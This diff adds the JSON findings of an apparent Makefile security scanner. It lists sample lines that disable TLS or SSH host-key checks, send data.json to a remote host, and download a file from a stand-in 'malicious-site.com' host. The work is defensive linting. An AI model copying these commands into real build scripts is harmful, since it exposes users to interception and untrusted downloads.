+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/Makefile",
+        "LineNumber": 9,
+        "Line": "- curl -k http://malicious-site.com/file -o downloaded_file",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
 ]
